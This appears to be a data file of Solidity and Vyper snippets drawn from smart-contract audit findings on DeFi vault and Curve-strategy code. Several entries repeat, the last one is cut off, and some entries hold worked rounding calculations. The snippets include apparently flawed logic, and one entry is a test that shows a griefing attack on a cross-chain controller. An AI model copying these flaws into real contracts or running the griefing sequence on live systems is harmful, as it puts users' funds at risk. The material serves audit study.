"```\nfunction blacklistProtocol(uint256 _protocolNum) external onlyGuardian {\n    uint256 balanceProtocol = balanceUnderlying(_protocolNum);\n    currentAllocations[_protocolNum] = 0;\n    controller.setProtocolBlacklist(vaultNumber, _protocolNum);\n    savedTotalUnderlying -= balanceProtocol;\n    withdrawFromProtocol(_protocolNum, balanceProtocol);\n}\n```"
"```\nfunction rebalanceNeeded() public view returns (bool) {\n    return (block.timestamp - lastTimeStamp) > rebalanceInterval || msg.sender == guardian;\n}\n```\nlastTimeStamp = block.timestamp;\n```\n```\nrequire(rebalanceNeeded(), ""No rebalance needed"")\n```"
"```\nfunction storePriceAndRewards(uint256 _totalUnderlying, uint256 _protocolId) internal {\n    uint256 currentPrice = price(_protocolId);\n    if (lastPrices[_protocolId] == 0) {\n        lastPrices[_protocolId] = currentPrice;\n        return;\n    }\n\n    int256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n    int256 nominator = (int256(_totalUnderlying * performanceFee) * priceDiff);\n    int256 totalAllocatedTokensRounded = totalAllocatedTokens / 1E18;\n    int256 denominator = totalAllocatedTokensRounded * int256(lastPrices[_protocolId]) * 100; // * 100 cause perfFee is in percentages\n\n    if (totalAllocatedTokensRounded == 0) {\n        rewardPerLockedToken[rebalancingPeriod][_protocolId] = 0;\n    } else {\n        rewardPerLockedToken[rebalancingPeriod][_protocolId] = nominator / denominator;\n    }\n\n    lastPrices[_protocolId] = currentPrice;\n}\n```"
"```\nvaults[_vaultNumber].deltaAllocationProtocol[_chainId][i] = 0;\n```\n```\nfunction setDeltaAllocationsInt(uint256 _protocolNum, int256 _allocation) internal {\n    require(!controller.getProtocolBlacklist(vaultNumber, _protocolNum), ""Protocol on blacklist"");\n    deltaAllocations[_protocolNum] += _allocation;\n    deltaAllocatedTokens += _allocation;\n}\n```"
"```\nfunction deposit(\n    uint256 _amount,\n    address _receiver\n) external nonReentrant onlyWhenVaultIsOn returns (uint256 shares) {\n    if (training) {\n        require(whitelist[msg.sender]);\n        uint256 balanceSender = (balanceOf(msg.sender) * exchangeRate) / (10 ** decimals());\n        require(_amount + balanceSender <= maxTrainingDeposit);\n    }\n}\n```\nFile: MainVault.sol\n\nfunction setXChainAllocationInt(\n    uint256 _amountToSend,\n    uint256 _exchangeRate,\n    bool _receivingFunds\n) internal {\n    amountToSendXChain = _amountToSend;\n    exchangeRate = _exchangeRate;\n\n    if (_amountToSend == 0 &&!_receivingFunds) {\n        settleReservedFunds();\n    } else if (_amountToSend == 0 && _receivingFunds) {\n        state = State.WaitingForFunds;\n    } else {\n        state = State.SendingFundsXChain;\n    }\n}\n\nFile: XChainController.sol\n\nuint256 totalUnderlying = getTotalUnderlyingVault(_vaultNumber) - totalWithdrawalRequests;\nuint256 totalSupply = getTotalSupply(_vaultNumber);\n\nuint256 decimals = xProvider.getDecimals(vault);\nuint256 newExchangeRate = (totalUnderlying * (10 ** decimals)) / totalSupply;\n```"
"```\nuint256 balanceBefore = getVaultBalance() - reservedFunds;\nvaultCurrency.safeTransferFrom(msg.sender, address(this), _amount);\nuint256 balanceAfter = getVaultBalance() - reservedFunds;\nuint256 amount = balanceAfter - balanceBefore;\n```"
"```\npushFeedbackToVault(_chainId, _vault, _relayerFee);\nxTransfer(_asset, _amount, _vault, _chainId, _slippage, _relayerFee);\n```\nAll messages are added to a Merkle root which is sent across chains every 30 minutes.\nAnd then those messages are executed by off-chain actors called routers.\n\nso it is indeed possible that messages are received out of order (and potentially with increased latency in between due to batch times)\nFor ""fast path"" (unauthenticated) messages, latency is not a concern, but ordering may still be (this is an artifact of the chain itself too btw)\none thing you can do is add a nonce to your messages so that you can yourself order them at destination\n```"
"```\nit('5) Grief xChainController send funds to vaults', async function () {\n  await xChainController.sendFundsToVault(vaultNumber, slippage, 10000, 0, { value: 0 });\n  await xChainController.sendFundsToVault(vaultNumber, slippage, 10000, 0, { value: 0 });\n  await xChainController.sendFundsToVault(vaultNumber, slippage, 10000, 0, { value: 0 });\n  await xChainController.sendFundsToVault(vaultNumber, slippage, 10000, 0, { value: 0 });\n\n  expect(await xChainController.getFundsReceivedState(vaultNumber)).to.be.equal(0);\n\n  expect(await vault3.state()).to.be.equal(3);\n\n  await expect(xChainController.sendFundsToVault(vaultNumber, slippage, 1000, relayerFee, { value: parseEther('0.1') })).to.be.revertedWith('Not all funds received');\n});"
```\naddress internal constant WETH = 0xC02aaA39b223FE8D0a0e5C4F27eAD9083C756Cc2;\n```
```\nfunction resetVaultUnderlying(uint256 _vaultNumber) internal {\n    vaults[_vaultNumber].totalUnderlying = 0;\n    vaultStage[_vaultNumber].underlyingReceived = 0;\n    vaults[_vaultNumber].totalSupply = 0;\n}\n```\n```\nuint256 totalUnderlying = getTotalUnderlyingVault(_vaultNumber) - totalWithdrawalRequests;\n```
```\nint256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n```
"```\nfunction withdrawalRequest(\n    uint256 _amount\n) external nonReentrant onlyWhenVaultIsOn returns (uint256 value) {\n    UserInfo storage user = userInfo[msg.sender];\n    require(user.withdrawalRequestPeriod == 0, ""Already a request"");\n\n    value = (_amount * exchangeRate) / (10 ** decimals());\n\n    _burn(msg.sender, _amount);\n\n    user.withdrawalAllowance = value;\n    user.withdrawalRequestPeriod = rebalancingPeriod;\n    totalWithdrawalRequests += value;\n}\n```"
"```\nuint256 relayerFee = _relayerFee!= 0? _relayerFee : msg.value;\n\nIConnext(connext).xcall{value: relayerFee}(\n    _destinationDomain,  // _destination: Domain ID of the destination chain\n    target,  // _to: address of the target contract\n    address(0),  // _asset: use address zero for 0-value transfers\n    msg.sender,  // _delegate: address that can revert or forceLocal on destination\n    0,  // _amount: 0 because no funds are being transferred\n    0,  // _slippage: can be anything between 0-10000 because no funds are being transferred\n    _callData  // _callData: the encoded calldata to send\n);\n```\n```\nIConnext(connext).xcall({\n    value: (msg.value - _relayerFee)\n}(\n    _destinationDomain, // _destination: Domain ID of the destination chain\n    _recipient, // _to: address receiving the funds on the destination\n    _token, // _asset: address of the token contract\n    msg.sender, // _delegate: address that can revert or forceLocal on destination\n    _amount, // _amount: amount of tokens to transfer\n    _slippage, // _slippage: the maximum amount of slippage the user will accept in BPS (e.g. 30 = 0.3%)\n    bytes("""")\n));\n```\nparams.delegate | (optional)\n    Address allowed to cancel an xcall on destination.\n```"
```\nint256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n```
"```\nfunction claim(address _aToken, address _claimer) public override returns (bool) {\n}"
"```\nfunction withdrawalRequest(\n    uint256 _amount\n) external nonReentrant onlyWhenVaultIsOn returns (uint256 value) {\n    UserInfo storage user = userInfo[msg.sender];\n    require(user.withdrawalRequestPeriod == 0, ""Already a request"");\n\n    value = (_amount * exchangeRate) / (10 ** decimals());\n\n    _burn(msg.sender, _amount);\n\n    user.withdrawalAllowance = value;\n    user.withdrawalRequestPeriod = rebalancingPeriod;\n    totalWithdrawalRequests += value;\n}\n```"
"```\nmodifier onlyWhenUnderlyingsReceived(uint256 _vaultNumber) {\n    require(\n        vaultStage[_vaultNumber].underlyingReceived == vaultStage[_vaultNumber].activeVaults,\n        ""Not all underlyings received""\n    );\n}\n```"
```\nfunction resetVaultUnderlying(uint256 _vaultNumber) internal {\n    vaults[_vaultNumber].totalUnderlying = 0;\n    vaultStage[_vaultNumber].underlyingReceived = 0;\n    vaults[_vaultNumber].totalSupply = 0;\n}\n```\n```\nuint256 totalUnderlying = getTotalUnderlyingVault(_vaultNumber) - totalWithdrawalRequests;\n```
"```\nit('5) Grief xChainController send funds to vaults', async function () {\n  await xChainController.sendFundsToVault(vaultNumber, slippage, 10000, 0, { value: 0 });\n  await xChainController.sendFundsToVault(vaultNumber, slippage, 10000, 0, { value: 0 });\n  await xChainController.sendFundsToVault(vaultNumber, slippage, 10000, 0, { value: 0 });\n  await xChainController.sendFundsToVault(vaultNumber, slippage, 10000, 0, { value: 0 });\n\n  expect(await xChainController.getFundsReceivedState(vaultNumber)).to.be.equal(0);\n\n  expect(await vault3.state()).to.be.equal(3);\n\n  await expect(xChainController.sendFundsToVault(vaultNumber, slippage, 1000, relayerFee, { value: parseEther('0.1') })).to.be.revertedWith('Not all funds received');\n});"
"```\npushFeedbackToVault(_chainId, _vault, _relayerFee);\nxTransfer(_asset, _amount, _vault, _chainId, _slippage, _relayerFee);\n```\nAll messages are added to a Merkle root which is sent across chains every 30 minutes.\nAnd then those messages are executed by off-chain actors called routers.\n\nso it is indeed possible that messages are received out of order (and potentially with increased latency in between due to batch times)\nFor ""fast path"" (unauthenticated) messages, latency is not a concern, but ordering may still be (this is an artifact of the chain itself too btw)\none thing you can do is add a nonce to your messages so that you can yourself order them at destination\n```"
"```\nuint256 balanceBefore = getVaultBalance() - reservedFunds;\nvaultCurrency.safeTransferFrom(msg.sender, address(this), _amount);\nuint256 balanceAfter = getVaultBalance() - reservedFunds;\nuint256 amount = balanceAfter - balanceBefore;\n```"
"```\nvaults[_vaultNumber].deltaAllocationProtocol[_chainId][i] = 0;\n```\n```\nfunction setDeltaAllocationsInt(uint256 _protocolNum, int256 _allocation) internal {\n    require(!controller.getProtocolBlacklist(vaultNumber, _protocolNum), ""Protocol on blacklist"");\n    deltaAllocations[_protocolNum] += _allocation;\n    deltaAllocatedTokens += _allocation;\n}\n```"
"```\naddress underlying = getUnderlyingAddress(_vaultNumber, _chain);\nuint256 balance = IERC20(underlying).balanceOf(address(this));\n```"
```\nuint256 newExchangeRate = (totalUnderlying * (10 ** decimals)) / totalSupply;\n```
"```\nfunction storePriceAndRewards(uint256 _totalUnderlying, uint256 _protocolId) internal {\n    uint256 currentPrice = price(_protocolId);\n    if (lastPrices[_protocolId] == 0) {\n        lastPrices[_protocolId] = currentPrice;\n        return;\n    }\n\n    int256 priceDiff = int256(currentPrice - lastPrices[_protocolId]);\n    int256 nominator = (int256(_totalUnderlying * performanceFee) * priceDiff);\n    int256 totalAllocatedTokensRounded = totalAllocatedTokens / 1E18;\n    int256 denominator = totalAllocatedTokensRounded * int256(lastPrices[_protocolId]) * 100; // * 100 cause perfFee is in percentages\n\n    if (totalAllocatedTokensRounded == 0) {\n        rewardPerLockedToken[rebalancingPeriod][_protocolId] = 0;\n    } else {\n        rewardPerLockedToken[rebalancingPeriod][_protocolId] = nominator / denominator;\n    }\n\n    lastPrices[_protocolId] = currentPrice;\n}\n```"
"```\nfunction rebalanceNeeded() public view returns (bool) {\n    return (block.timestamp - lastTimeStamp) > rebalanceInterval || msg.sender == guardian;\n}\n```\nlastTimeStamp = block.timestamp;\n```\n```\nrequire(rebalanceNeeded(), ""No rebalance needed"")\n```"
"```\nfunction blacklistProtocol(uint256 _protocolNum) external onlyGuardian {\n    uint256 balanceProtocol = balanceUnderlying(_protocolNum);\n    currentAllocations[_protocolNum] = 0;\n    controller.setProtocolBlacklist(vaultNumber, _protocolNum);\n    savedTotalUnderlying -= balanceProtocol;\n    withdrawFromProtocol(_protocolNum, balanceProtocol);\n}\n```"
"```\nfunction addToTotalRewards(uint256 _basketId) internal onlyBasketOwner(_basketId) {\n    if (baskets[_basketId].nrOfAllocatedTokens == 0) {\n        return;\n    }\n\n    uint256 vaultNum = baskets[_basketId].vaultNumber;\n    uint256 currentRebalancingPeriod = vaults[vaultNum].rebalancingPeriod;\n    uint256 lastRebalancingPeriod = baskets[_basketId].lastRebalancingPeriod;\n\n    if (currentRebalancingPeriod <= lastRebalancingPeriod) {\n        return;\n    }\n\n    for (uint k = 0; k < chainIds.length; k++) {\n        uint32 chain = chainIds[k];\n        uint256 latestProtocol = latestProtocolId[chain];\n\n        for (uint i = 0; i < latestProtocol; i++) {\n            int256 allocation = basketAllocationInProtocol(_basketId, chain, i) / 1E18;\n            if (allocation == 0) {\n                continue;\n            }\n\n            int256 lastRebalanceReward = getRewardsPerLockedToken(\n                vaultNum,\n                chain,\n                lastRebalancingPeriod,\n                i\n            );\n            int256 currentReward = getRewardsPerLockedToken(\n                vaultNum,\n                chain,\n                currentRebalancingPeriod,\n                i\n            );\n            baskets[_basketId].totalUnRedeemedRewards +=\n                (currentReward - lastRebalanceReward) * allocation;\n        }\n    }\n}"
"```\nfunction rebalanceXChain(uint256 _slippage, uint256 _relayerFee) external payable {\n    require(state == State.SendingFundsXChain, stateError);\n\n    if (amountToSendXChain > getVaultBalance()) {\n        pullFunds(amountToSendXChain);\n        if (amountToSendXChain > getVaultBalance()) {\n            amountToSendXChain = getVaultBalance();\n        }\n    }\n\n    vaultCurrency.safeIncreaseAllowance(xProvider, amountToSendXChain);\n    IXProvider(xProvider).xTransferToController{value: msg.value}(\n        vaultNumber,\n        amountToSendXChain,\n        address(vaultCurrency),\n        _slippage,\n        _relayerFee\n    );\n\n    emit RebalanceXChain(vaultNumber, amountToSendXChain, address(vaultCurrency));\n\n    amountToSendXChain = 0;\n    settleReservedFunds();\n}\n```\nif (amountToSendXChain > getVaultBalance()):\n    pullFunds(amountToSendXChain)\nif amountToSendXChain > getVaultBalance():\n    amountToSendXChain = getVaultBalance()\n```"
"```\nfunction deposit(\n    uint256 _amount,\n    address _receiver\n) external nonReentrant onlyWhenVaultIsOn returns (uint256 shares) {\n    if (training) {\n        require(whitelist[msg.sender]);\n        uint256 balanceSender = (balanceOf(msg.sender) * exchangeRate) / (10 ** decimals());\n        require(_amount + balanceSender <= maxTrainingDeposit);\n    }\n```"
"```\nfunction getExecutionData(address from, Trade calldata trade)\n    internal view returns (\n        address spender,\n        address target,\n        uint256 msgValue,\n        bytes memory executionCallData\n    ) {\n    if (trade.tradeType == TradeType.EXACT_IN_SINGLE) {\n        CurveV2SingleData memory data = abi.decode(trade.exchangeData, (CurveV2SingleData));\n        executionCallData = abi.encodeWithSelector(\n            ICurveRouterV2.exchange.selector,\n            data.pool,\n            _getTokenAddress(trade.sellToken),\n            _getTokenAddress(trade.buyToken),\n            trade.amount,\n            trade.limit,\n            address(this)\n        );\n    } else if (trade.tradeType == TradeType.EXACT_IN_BATCH) {\n        CurveV2BatchData memory data = abi.decode(trade.exchangeData, (CurveV2BatchData));\n        address[4] memory pools;\n        executionCallData = abi.encodeWithSelector(\n            ICurveRouterV2.exchange_multiple.selector,\n            data.route,\n            data.swapParams,\n            trade.amount,\n            trade.limit,\n            pools,\n            address(this)\n        );\n    }\n```\n```\nfunction _exactInBatch(Trade memory trade) internal view returns (bytes memory executionCallData) {\n    CurveBatchData memory data = abi.decode(trade.exchangeData, (CurveBatchData));\n\n    return abi.encodeWithSelector(\n        ICurveRouter.exchange.selector,\n        trade.amount,\n        data.route,\n        data.indices,\n        trade.limit\n    );\n}\n```\n```\nfunction _approve(Trade memory trade, address spender) private {\n    uint256 allowance = _isExactIn(trade)? trade.amount : trade.limit;\n    address sellToken = trade.sellToken;\n\n    if (sellToken == Constants.ETH_ADDRESS) {\n        sellToken = address(Deployments.WETH);\n    }\n    IERC20(sellToken).approve(spender, allowance);\n}\n```"
"```\nfunction _executeSettlement(\n    StrategyContext calldata strategyContext,\n    Curve2TokenPoolContext calldata poolContext,\n    uint256 maturity,\n    uint256 poolClaimToSettle,\n    uint256 redeemStrategyTokenAmount,\n    RedeemParams memory params\n) private {\n    (uint256 spotPrice, uint256 oraclePrice) = poolContext._getSpotPriceAndOraclePrice(strategyContext);\n\n    (params.minPrimary, params.minSecondary) = poolContext.basePool._getMinExitAmounts({\n        strategyContext: strategyContext,\n        oraclePrice: oraclePrice,\n        spotPrice: spotPrice,\n        poolClaim: poolClaimToSettle\n    });\n```\n```\nminPrimary = (\n    poolContext.primaryBalance * \n    poolClaim * \n    strategyContext.vaultSettings.poolSlippageLimitPercent / \n    (totalPoolSupply * uint256(VaultConstants.VAULT_PERCENT_BASIS))\n)\n\nminPrimary = (\n    50 DAI * \n    (50 LP_TOKEN / 100 LP_TOKEN) * \n    (99.75% / 100%)\n)\n\nminSecondary = (\n    same calculation = \n    74.8125 USDC\n)\n```\n```\nfunction _getMinExitAmounts(\n    TwoTokenPoolContext calldata poolContext,\n    StrategyContext calldata strategyContext,\n    uint256 spotPrice,\n    uint256 oraclePrice,\n    uint256 poolClaim\n) internal view returns (uint256 minPrimary, uint256 minSecondary) {\n    strategyContext._checkPriceLimit(oraclePrice, spotPrice);\n\n    uint256 totalPoolSupply = poolContext.poolToken.totalSupply();\n    minPrimary = (poolContext.primaryBalance * poolClaim * \n        strategyContext.vaultSettings.poolSlippageLimitPercent) / \n        (totalPoolSupply * uint256(VaultConstants.VAULT_PERCENT_BASIS));\n    minSecondary = (poolContext.secondaryBalance * poolClaim * \n        strategyContext.vaultSettings.poolSlippageLimitPercent) / \n        (totalPoolSupply * uint256(VaultConstants.VAULT_PERCENT_BASIS));\n}\n```\n```\nfunction _unstakeAndExitPool(\n    Curve2TokenPoolContext memory poolContext,\n    ConvexStakingContext memory stakingContext,\n    uint256 poolClaim,\n    RedeemParams memory params\n) internal returns (uint256 primaryBalance, uint256 secondaryBalance) {\n    bool success = stakingContext.rewardPool.withdrawAndUnwrap(poolClaim, false);\n    if (!success) revert Errors.UnstakeFailed();\n\n    if (params.secondaryTradeParams.length == 0) {\n        primaryBalance = ICurve2TokenPool(address(poolContext.curvePool)).remove_liquidity_one_coin(\n            poolClaim, int8(poolContext.basePool.primaryIndex), params.minPrimary\n        );\n    } else {\n        uint256[2] memory minAmounts;\n        minAmounts[poolContext.basePool.primaryIndex] = params.minPrimary;\n        minAmounts[poolContext.basePool.secondaryIndex] = params.minSecondary;\n        uint256[2] memory exitBalances = ICurve2TokenPool(address(poolContext.curvePool)).remove_liquidity(\n            poolClaim, minAmounts\n        );\n\n        (primaryBalance, secondaryBalance) = (\n            exitBalances[poolContext.basePool.primaryIndex],\n            exitBalances[poolContext.basePool.secondaryIndex]\n        );\n    }\n}\n```\n@notice Withdraw a single coin from the pool\n@param _token_amount Amount of LP tokens to burn in the withdrawal\n@param i Index value of the coin to withdraw\n@param _min_amount Minimum amount of coin to receive\n@return Amount of coin received\ndef remove_liquidity_one_coin(\n    _token_amount: uint256,\n    i: int128,\n    _min_amount: uint256\n) -> uint256:\n```\n```\nremove_liquidity_one_coin(poolClaim, int8(poolContext.basePool.primaryIndex), params.minPrimary)\nremove_liquidity_one_coin(50, LP_TOKEN, Index(0) = DAI, 24.9375, DAI)\n```"
"```\nfunction reinvestReward(\n    Curve2TokenConvexStrategyContext calldata context,\n    ReinvestRewardParams calldata params\n) external {\n    // Make sure we are joining with the right proportion to minimize slippage\n    poolContext._validateSpotPriceAndPairPrice({\n        strategyContext: strategyContext,\n        oraclePrice: poolContext.basePool._getOraclePairPrice(strategyContext),\n        primaryAmount: primaryAmount,\n        secondaryAmount: secondaryAmount\n    });\n```\n```\nfunction _checkPrimarySecondaryRatio(\n    StrategyContext memory strategyContext,\n    uint256 primaryAmount,\n    uint256 secondaryAmount,\n    uint256 primaryPoolBalance,\n    uint256 secondaryPoolBalance\n) private pure {\n    uint256 totalAmount = primaryAmount + secondaryAmount;\n    uint256 totalPoolBalance = primaryPoolBalance + secondaryPoolBalance;\n\n    uint256 primaryPercentage = primaryAmount * CurveConstants.CURVE_PRECISION / totalAmount;\n    uint256 expectedPrimaryPercentage = primaryPoolBalance * CurveConstants.CURVE_PRECISION / totalPoolBalance;\n\n    strategyContext._checkPriceLimit(expectedPrimaryPercentage, primaryPercentage);\n\n    uint256 secondaryPercentage = secondaryAmount * CurveConstants.CURVE_PRECISION / totalAmount;\n    uint256 expectedSecondaryPercentage = secondaryPoolBalance * CurveConstants.CURVE_PRECISION / totalPoolBalance;\n\n    strategyContext._checkPriceLimit(expectedSecondaryPercentage, secondaryPercentage);\n}\n```\n```\ndef add_liquidity(amounts: uint256[N_COINS], min_mint_amount: uint256) -> uint256:\n    if token_supply > 0:\n        fee: uint256 = self.fee * N_COINS / (4 * (N_COINS - 1))\n        admin_fee: uint256 = self.admin_fee\n\n        for i in range(N_COINS):\n            ideal_balance: uint256 = D1 * old_balances[i] / D0\n            difference: uint256 = 0\n            if ideal_balance > new_balances[i]:\n                difference = ideal_balance - new_balances[i]\n            else:\n                difference = new_balances[i] - ideal_balance\n            fees[i] = fee * difference / FEE_DENOMINATOR\n            if admin_fee!= 0:\n                self.admin_balances[i] += fees[i] * admin_fee / FEE_DENOMINATOR\n            new_balances[i] -= fees[i]\n\n        D2 = self.get_D(new_balances, amp)\n        mint_amount = token_supply * (D2 - D0) / D0\n    else:\n        mint_amount = D1  # Take the dust if there was any\n```"
"```\nfunction _getTimeWeightedPrimaryBalance(\n    TwoTokenPoolContext memory poolContext,\n    StrategyContext memory strategyContext,\n    uint256 poolClaim,\n    uint256 oraclePrice,\n    uint256 spotPrice\n) internal view returns (uint256 primaryAmount) {\n    strategyContext._checkPriceLimit(oraclePrice, spotPrice);\n\n    uint256 totalSupply = poolContext.poolToken.totalSupply();\n    uint256 primaryBalance = poolContext.primaryBalance * poolClaim / totalSupply;\n    uint256 secondaryBalance = poolContext.secondaryBalance * poolClaim / totalSupply;\n\n    uint256 secondaryAmountInPrimary = secondaryBalance * strategyContext.poolClaimPrecision / oraclePrice;\n\n    uint256 primaryPrecision = 10 ** poolContext.primaryDecimals;\n    primaryAmount = (primaryBalance + secondaryAmountInPrimary) * primaryPrecision / strategyContext.poolClaimPrecision;\n}\n```\n```\nprimaryBalance = poolContext.primaryBalance * poolClaim / totalSupply\nsecondaryBalance = poolContext.secondaryBalance * poolClaim / totalSupply\n```\n```\nsecondaryAmountInPrimary = secondaryBalance * strategyContext.poolClaimPrecision / oraclePrice;\n\nsecondaryAmountInPrimary = (50 * 10**18) / (1 * 10**18)\n\nsecondaryAmountInPrimary = (50 * 10**6)\n\nsecondaryAmountInPrimary = 50 * 10**6\n```\n```\nprimaryAmount = (primaryBalance + secondaryAmountInPrimary) * primaryPrecision / strategyContext.poolClaimPrecision\n\nprimaryAmount = ((50 * 10**18) + (50 * 10**6)) * 10**18 / 10**18\n\nprimaryAmount = (50 * 10**18) + (50 * 10**6)\nprimaryAmount = 50 DAI + 0.00000000005 DAI\nprimaryAmount = 50.00000000005 DAI\n```\n```\nprimaryBalance = poolContext.primaryBalance * poolClaim / totalSupply\nsecondaryBalance = poolContext.secondaryBalance * poolClaim / totalSupply\n```\n```\nsecondaryAmountInPrimary = secondaryBalance * strategyContext.poolClaimPrecision / oraclePrice;\n\nsecondaryAmountInPrimary = (50 * 10**18) / (1 * 10**18)\n\nsecondaryAmountInPrimary = 50 * 10**18\n```\n```\nprimaryAmount = (primaryBalance + secondaryAmountInPrimary) * primaryPrecision / strategyContext.poolClaimPrecision\n\nprimaryAmount = ((50 * 10**6) + (50 * 10**18)) * 10**6 / 10**18\nprimaryAmount = ((50 * 10**6) + (50 * 10**18)) / 10**12\nprimaryAmount = 50000000.00005\n```"
"```\nfunction _executeTradeExactIn(\n    TradeParams memory params,\n    ITradingModule tradingModule,\n    address sellToken,\n    address buyToken,\n    uint256 amount,\n    bool useDynamicSlippage\n) internal returns (uint256 amountSold, uint256 amountBought) {\n    require(\n        params.tradeType == TradeType.EXACT_IN_SINGLE || params.tradeType == TradeType.EXACT_IN_BATCH\n    );\n    if (useDynamicSlippage) {\n        require(params.oracleSlippagePercentOrLimit <= Constants.SLIPPAGE_LIMIT_PRECISION);\n    }\n\n    Trade memory trade = Trade(\n        params.tradeType,\n        sellToken,\n        buyToken,\n        amount,\n        useDynamicSlippage? 0 : params.oracleSlippagePercentOrLimit,\n        block.timestamp, // deadline\n        params.exchangeData\n    );\n```"
"```\nfunction _checkPriceLimit(\n    StrategyContext memory strategyContext,\n    uint256 oraclePrice,\n    uint256 poolPrice\n) internal pure {\n    uint256 lowerLimit = (oraclePrice * \n        (VaultConstants.VAULT_PERCENT_BASIS - \n            strategyContext.vaultSettings.oraclePriceDeviationLimitPercent)) / \n        VaultConstants.VAULT_PERCENT_BASIS;\n    uint256 upperLimit = (oraclePrice * \n        (VaultConstants.VAULT_PERCENT_BASIS + \n            strategyContext.vaultSettings.oraclePriceDeviationLimitPercent)) / \n        VaultConstants.VAULT_PERCENT_BASIS;\n\n    if (poolPrice < lowerLimit || upperLimit < poolPrice) {\n        revert Errors.InvalidPrice(oraclePrice, poolPrice);\n    }\n}\n```\n```\nfunction _checkPrimarySecondaryRatio(\n    StrategyContext memory strategyContext,\n    uint256 primaryAmount,\n    uint256 secondaryAmount,\n    uint256 primaryPoolBalance,\n    uint256 secondaryPoolBalance\n) private pure {\n    uint256 totalAmount = primaryAmount + secondaryAmount;\n    uint256 totalPoolBalance = primaryPoolBalance + secondaryPoolBalance;\n\n    uint256 primaryPercentage = primaryAmount * CurveConstants.CURVE_PRECISION / totalAmount;\n    uint256 expectedPrimaryPercentage = primaryPoolBalance * CurveConstants.CURVE_PRECISION / totalPoolBalance;\n\n    strategyContext._checkPriceLimit(expectedPrimaryPercentage, primaryPercentage);\n\n    uint256 secondaryPercentage = secondaryAmount * CurveConstants.CURVE_PRECISION / totalAmount;\n    uint256 expectedSecondaryPercentage = secondaryPoolBalance * CurveConstants.CURVE_PRECISION / totalPoolBalance;\n\n    strategyContext._checkPriceLimit(expectedSecondaryPercentage, secondaryPercentage);\n}\n```"
"```\nabstract contract Curve2TokenPoolMixin is CurvePoolMixin {\n    constructor(\n        NotionalProxy notional_,\n        ConvexVaultDeploymentParams memory params\n    ) CurvePoolMixin(notional_, params) {\n        address primaryToken = _getNotionalUnderlyingToken(params.baseParams.primaryBorrowCurrencyId);\n\n        PRIMARY_TOKEN = primaryToken;\n\n        if (primaryToken == Deployments.ETH_ADDRESS) {\n            primaryToken = Deployments.ALT_ETH_ADDRESS;\n        }\n\n        address token0 = CURVE_POOL.coins(0);\n        address token1 = CURVE_POOL.coins(1);\n\n        uint8 primaryIndex;\n        address secondaryToken;\n        if (token0 == primaryToken) {\n            primaryIndex = 0;\n            secondaryToken = token1;\n        } else {\n            primaryIndex = 1;\n            secondaryToken = token0;\n        }\n\n        if (secondaryToken == Deployments.ALT_ETH_ADDRESS) {\n            secondaryToken = Deployments.ETH_ADDRESS;\n        }\n\n        PRIMARY_INDEX = primaryIndex;\n        SECONDARY_TOKEN = secondaryToken;\n    }\n}\n```\ncontract Curve2TokenConvexVault is Curve2TokenVaultMixin {\n    function initialize(InitParams calldata params)\n        external\n        initializer\n        onlyNotionalOwner\n    {\n        __INIT_VAULT(params.name, params.borrowCurrencyId);\n        CurveVaultStorage.setStrategyVaultSettings(params.settings);\n\n        if (PRIMARY_TOKEN!= Deployments.ALT_ETH_ADDRESS) {\n            IERC20(PRIMARY_TOKEN).checkApprove(address(CURVE_POOL), type(uint256).max);\n        }\n        if (SECONDARY_TOKEN!= Deployments.ALT_ETH_ADDRESS) {\n            IERC20(SECONDARY_TOKEN).checkApprove(address(CURVE_POOL), type(uint256).max);\n        }\n\n        CURVE_POOL_TOKEN.checkApprove(address(CONVEX_BOOSTER), type(uint256).max);\n    }\n```"
"```\nfunction _executeSettlement(\n    StrategyContext calldata strategyContext,\n    Curve2TokenPoolContext calldata poolContext,\n    uint256 maturity,\n    uint256 poolClaimToSettle,\n    uint256 redeemStrategyTokenAmount,\n    RedeemParams memory params\n) private {\n    (uint256 spotPrice, uint256 oraclePrice) = poolContext._getSpotPriceAndOraclePrice(strategyContext);\n\n    (params.minPrimary, params.minSecondary) = poolContext.basePool._getMinExitAmounts({\n        strategyContext: strategyContext,\n        oraclePrice: oraclePrice,\n        spotPrice: spotPrice,\n        poolClaim: poolClaimToSettle\n    });\n```\n```\nfunction _getMinExitAmounts(\n    TwoTokenPoolContext calldata poolContext,\n    StrategyContext calldata strategyContext,\n    uint256 spotPrice,\n    uint256 oraclePrice,\n    uint256 poolClaim\n) internal view returns (uint256 minPrimary, uint256 minSecondary) {\n    strategyContext._checkPriceLimit(oraclePrice, spotPrice);\n\n    uint256 totalPoolSupply = poolContext.poolToken.totalSupply();\n    minPrimary = (poolContext.primaryBalance * poolClaim * \n        strategyContext.vaultSettings.poolSlippageLimitPercent) / \n        (totalPoolSupply * uint256(VaultConstants.VAULT_PERCENT_BASIS)); // @audit-info VAULT_PERCENT_BASIS = 1e4 = 10000\n    minSecondary = (poolContext.secondaryBalance * poolClaim * \n        strategyContext.vaultSettings.poolSlippageLimitPercent) / \n        (totalPoolSupply * uint256(VaultConstants.VAULT_PERCENT_BASIS));\n}\n```\n```\n@external\n@nonreentrant('lock')\ndef remove_liquidity(\n    _amount: uint256,\n    _min_amounts: uint256[N_COINS],\n) -> uint256[N_COINS]:\n    """"""\n    Withdraw coins from the pool\n    Withdrawal amounts are based on current deposit ratios\n    @param _amount Quantity of LP tokens to burn in the withdrawal\n    @param _min_amounts Minimum amounts of underlying coins to receive\n    @return List of amounts of coins that were withdrawn\n    """"""\n    amounts: uint256[N_COINS] = self._balances()\n    lp_token: address = self.lp_token\n    total_supply: uint256 = ERC20(lp_token).totalSupply()\n\n    CurveToken(lp_token).burnFrom(msg.sender, _amount)  # insufficient funds\n\n    for i in range(N_COINS):\n        value: uint256 = amounts[i] * _amount / total_supply\n        assert value >= _min_amounts[i], ""Withdrawal resulted in fewer coins than expected""\n\n        amounts[i] = value\n        if i == 0:\n            raw_call(msg.sender, b"""", value=value)\n        else:\n            assert ERC20(self.coins[1]).transfer(msg.sender, value)\n\n    log RemoveLiquidity(msg.sender, amounts, [], total_supply - _amount)\n\n    return amounts\n```\n```\nminPrimary = (\n    poolContext.primaryBalance * \n    poolClaim * \n    strategyContext.vaultSettings.poolSlippageLimitPercent / \n    (totalPoolSupply * uint256(VaultConstants.VAULT_PERCENT_BASIS))\n)\n\nminPrimary = (\n    100 * DAI * \n    (50 * LP_TOKEN / 100 * LP_TOKEN) * \n    (99.75 / 100)\n)\n\nminSecondary = (\n    same calculation = \n    49.875 * USDC\n```\n```\na = CurvePool's remove_liquidity => x 